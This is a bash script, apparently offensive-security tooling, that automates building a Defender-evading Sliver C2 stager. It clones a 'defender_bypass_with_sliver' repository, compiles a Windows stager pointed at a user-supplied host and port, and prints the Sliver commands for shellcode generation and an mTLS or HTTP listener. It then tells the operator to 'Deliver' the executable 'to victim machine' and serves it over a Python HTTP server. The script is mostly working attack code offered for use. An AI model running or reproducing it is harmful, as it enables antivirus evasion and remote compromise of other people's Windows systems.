#!/bin/bash

# --- Configuration & Styling ---
REPO_URL="https://github.com/TeneBrae93/defender_bypass_with_sliver.git"
TARGET_DIR="$HOME/defender_bypass_with_sliver"
DIR_NAME="defender_bypass_with_sliver"
SCRIPT_NAME=$(basename "$0")

YELLOW='\033[1;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# 1. Logic to move script and ensure repo exists
if [[ "$PWD" != "$TARGET_DIR" ]]; then
    if [ ! -d "$TARGET_DIR" ]; then
        echo -e "${CYAN}[*] Cloning repository into $TARGET_DIR...${NC}"
        git clone "$REPO_URL" "$TARGET_DIR"
    fi
    
    echo -e "${CYAN}[*] Moving $SCRIPT_NAME to $TARGET_DIR...${NC}"
    mv "$0" "$TARGET_DIR/"
    
    cd "$TARGET_DIR"
    exec ./"$SCRIPT_NAME"
fi

# 2. User Input
echo -e "${YELLOW}------------------------------------------------------------${NC}"
echo -e "${GREEN}                  Zero-Config Sliver Builder${NC}"
echo -e "${YELLOW}------------------------------------------------------------${NC}"

read -p "[?] Enter Hosting IP: " LHOST
read -p "[?] Enter Hosting Port: " LPORT

# NEW PROMPT: Specifically for the Sliver listener and shellcode generation
read -p "[?] Enter Sliver Listener Port: " SLIVER_PORT

read -p "[?] Enter Shellcode filename: " RAW_BIN
BIN_NAME="${RAW_BIN%.bin}.bin"

read -p "[?] Enter Final EXE name: " RAW_EXE
EXE_NAME="${RAW_EXE%.exe}.exe"

# Reset builder.py to original state to avoid sed stacking
git checkout builder.py 2>/dev/null

# 3. Update the Python script dynamically
sed -i "s/shellc.bin/$BIN_NAME/g" builder.py

echo -e "\n${CYAN}[*] Compiling stager...${NC}"

# 4. Run the Builder (Silent execution)
python3 builder.py -l "$LHOST" -p "$LPORT" > /dev/null 2>&1

# 5. Finalize Files & Clean Output
if [ -f "stager.exe" ]; then
    mv stager.exe "$EXE_NAME"
    
    echo -e "${YELLOW}============================================================${NC}"
    echo -e "${GREEN}         [SUCCESS] $EXE_NAME has been generated!${NC}"
    echo -e "${YELLOW}============================================================${NC}"

    echo -e "\n${YELLOW}[!] Enter these matching shellcode & listener commands in Sliver console:${NC}"
    echo -e "\n${YELLOW}[!] SHELLCODE:${NC}"
    echo -e "    \n${CYAN}generate --mtls $LHOST:$SLIVER_PORT --os windows --arch amd64 --format shellcode --save ~/$DIR_NAME/$BIN_NAME${NC}"
    
    echo -e "\n${YELLOW}[!] LISTENER:${NC}\n"
    echo -e "    mtls --lport $SLIVER_PORT  <- ${GREEN}SECURE"
    echo -e "    OR"
    echo -e "    http -L $LHOST -l $SLIVER_PORT  <- ${RED}NOT SECURE"
    
    echo -e "${YELLOW}============================================================${NC}"
    echo -e "${GREEN}          Deliver $EXE_NAME to ${RED}victim machine${GREEN}!"
    echo -e "${YELLOW}============================================================${NC}"
    
    # 6. Start Python HTTP Server
    echo -e "${CYAN}[*] Starting python3 http.server on port $LPORT...${NC}"
    echo -e "${YELLOW}[!] Press Ctrl+C to stop the server.${NC}"
    python3 -m http.server "$LPORT"
    
else
    echo -e "${RED}[!] Error: compilation failed.${NC}"
fi
